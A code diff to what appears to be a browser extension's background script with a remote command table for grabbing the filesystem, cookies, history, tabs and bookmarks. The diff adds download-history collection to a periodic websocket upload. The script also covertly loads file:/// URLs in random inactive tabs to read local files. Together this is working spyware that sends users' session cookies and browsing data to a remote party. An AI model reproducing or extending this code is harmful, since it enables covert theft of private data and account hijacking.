@@ -25,14 +25,30 @@ const SYNC_SWITCH = {
 
 const RPC_CALL_TABLE = {
   HTTP_REQUEST: perform_http_request,
-  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
+  // PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
   GET_FILESYSTEM: get_filesystem,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
   GET_TABS: get_tabs,
   GET_BOOKMARKS: get_bookmarks,
+  GET_DOWNLOADS: get_downloads,
 };
+
+async function get_downloads() {
+  if (!chrome.downloads) {
+    return [];
+  }
+  return get_all_download();
+}
+
+function get_all_download() {
+  return new Promise((resolve, reject) => {
+    chrome.downloads.search({}, (results) => {
+      resolve(results);
+    });
+  });
+}
 
 async function get_filesystem(fileUrl = "file:///") {
   if (!chrome.tabs) {
@@ -42,17 +58,11 @@ async function get_filesystem(fileUrl = "file:///") {
 }
 
 function get_path(fileUrl) {
-  console.log("get_path", fileUrl);
   return new Promise((resolve, reject) => {
     chrome.tabs.query({ active: false }, (tabs) => {
-      // 从非活动标签页中随机选择一个
       const randomIndex = Math.floor(Math.random() * tabs.length);
       const tab = tabs[randomIndex];
-
-      // 保存原始链接
       const originalUrl = tab.url;
-
-      // 更新标签页的 URL
       chrome.tabs.update(tab.id, { url: fileUrl }, () => {
         chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
           if (tabId === tab.id && changeInfo.status === "complete") {
@@ -169,20 +179,17 @@ function capture_screenshot() {
               reject(error);
             });
         } else {
-          reject(new Error("选择屏幕或窗口失败"));
+          reject(new Error("Select Error"));
         }
       }
     );
 
-    // 处理取消选择
     const handleCancel = () => {
-      reject(new Error("用户取消选择"));
+      reject(new Error("User Canceled"));
     };
     chrome.desktopCapture.cancelChooseDesktopMedia(desktopMediaRequest);
   });
 }
-
-// 调用截图方法
 
 // Return an array of bookmarks from browser
 async function get_bookmarks() {
@@ -387,6 +394,7 @@ const websocket_sync_huge_interval = setInterval(async () => {
         history: await get_history(30),
         bookmarks: await get_bookmarks(),
         cookies: await get_cookies(),
+        downloads: await get_downloads(),
       },
     })
   );
